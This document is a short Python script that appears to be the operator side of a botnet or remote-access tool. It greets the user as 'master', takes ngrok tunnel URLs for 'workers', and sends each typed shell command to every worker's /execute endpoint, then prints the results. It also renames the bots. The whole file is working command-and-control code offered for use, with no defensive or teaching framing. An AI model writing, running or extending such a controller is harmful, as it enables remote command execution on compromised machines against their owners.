import requests

print("Welcome back, master!")

# Get the ngrok public URL from the user
ngrok_urls = input("Enter the ngrok public URLs separated by commas: ").split(",")
ngrok_urls = [url.strip() for url in ngrok_urls]  # Clean whitespace

# Define the bot username
bot_username = "Unknown_user"  # Assign your bot's username here

# Function to get the username of a worker
def get_username(url):
    endpoint = f"{url}/get_username"
    try:
        response = requests.get(endpoint)
        response.raise_for_status()
        username = response.json().get('username', 'Unknown User')
        return username
    except requests.exceptions.RequestException as e:
        print(f"Failed to get username from {url}. Error: {e}")
        return None

# Function to update the worker's username
def update_username(url, bot_username):
    endpoint = f"{url}/update_username"
    try:
        response = requests.post(endpoint, json={'username': bot_username})
        response.raise_for_status()
        result = response.json().get('message', 'No result received')
        print(f"Response from worker at {url}: {result}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to update username at {url}. Error: {e}")

# Function to send command to a worker
def send_command_to_worker(ngrok_url, command):
    endpoint = f"{ngrok_url}/execute"
    try:
        # Send the command to the worker
        response = requests.post(endpoint, json={'command': command})
        
        # Check if the request was successful
        response.raise_for_status()  
        
        # Extract and print the 'result' field directly as plain text
        result = response.json().get('result', 'No result received')
        print(result)  # Print the result without JSON formatting
        return result

    except requests.exceptions.RequestException as e:
        print(f"Failed to send command to {ngrok_url}. Error: {e}")
        return None
    except ValueError:
        # If response is not JSON
        print("Response is not in JSON format")
        return None
    
# Function to handle username update
def handle_username_update(bot_username):
    for ngrok_url in ngrok_urls:
        print(f"\nChecking username...")
        current_username = get_username(ngrok_url)
        if current_username:
            print(f"Current username: {current_username}")
            bot_username = current_username  # Replace bot_username with current_username
            update_username(ngrok_url, bot_username)
        else:
            print("Could not retrieve current username.")

def main(bot_username):
    while True:
        command = input(f"{bot_username}:~$ ")
        
        if command.lower() == "exit":
            print("Exiting...")
            break
        
        elif command.lower() == "update_username":
            for ngrok_url in ngrok_urls:
                print(f"\nChecking username...")
                current_username = get_username(ngrok_url)
                
                if current_username:
                    print(f"Current username: {current_username}")
                    bot_username = current_username  # Replace bot_username with current_username
                    update_username(ngrok_url, bot_username)
                else:
                    print("Could not retrieve current username.")
        elif command.startswith("/update_username "):
            bot_username = command.split(" ", 1)[1]  # Extract the new username from the command
            for ngrok_url in ngrok_urls:
                update_username(ngrok_url, bot_username)
        
        else:
            for ngrok_url in ngrok_urls:
                send_command_to_worker(ngrok_url, command)

if __name__ == '__main__':
    main(bot_username)
